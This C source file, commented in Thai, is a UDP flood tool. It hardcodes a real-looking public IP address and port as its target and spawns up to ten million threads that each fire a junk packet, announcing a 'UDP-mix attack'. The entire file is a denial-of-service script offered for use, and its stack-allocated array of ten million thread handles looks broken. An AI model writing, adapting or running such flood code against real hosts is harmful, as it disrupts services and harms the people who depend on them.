#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PACKET_SIZE 1024
#define TARGET_PORT 10012  // เปลี่ยนพอร์ตตามต้องการ
#define TARGET_IP "202.181.73.208"  // เปลี่ยน IP ตามต้องการ
#define NUM_THREADS 10000000  // จำนวนเธรดทั้งหมด
#define PACKETS_PER_THREAD 1  // จำนวนแพ็กเก็ตที่แต่ละเธรดจะส่ง

// โครงสร้างที่ใช้ส่งแพ็กเก็ต
typedef struct {
    int sockfd;
    struct sockaddr_in target_addr;
} thread_data_t;

// ฟังก์ชันที่ใช้ส่งแพ็กเก็ต UDP
void *send_udp_packet(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    char packet[PACKET_SIZE];
    memset(packet, 'X', PACKET_SIZE);  // กำหนดค่าข้อมูลในแพ็กเก็ต

    for (int i = 0; i < PACKETS_PER_THREAD; i++) {
        if (sendto(data->sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *)&data->target_addr, sizeof(data->target_addr)) == -1) {
            perror("sendto failed");
            exit(1);
        }
    }

    return NULL;
}

int main() {
    int sockfd;
    struct sockaddr_in target_addr;
    pthread_t threads[NUM_THREADS];

    // สร้าง socket UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(1);
    }

    // กำหนดค่า target address (IP และ Port)
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);

    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        perror("invalid address or address not supported");
        exit(1);
    }

    printf("Starting UDP-mix attack on %s:%d...\n", TARGET_IP, TARGET_PORT);

    // สร้างเธรดทั้งหมด
    for (int i = 0; i < NUM_THREADS; i++) {
        thread_data_t *data = (thread_data_t *)malloc(sizeof(thread_data_t));
        data->sockfd = sockfd;
        data->target_addr = target_addr;

        if (pthread_create(&threads[i], NULL, send_udp_packet, (void *)data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // รอให้ทุกเธรดทำงานเสร็จ
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    // ปิด socket
    close(sockfd);

    printf("Finished sending 10,000,000 packets.\n");
    return 0;
}
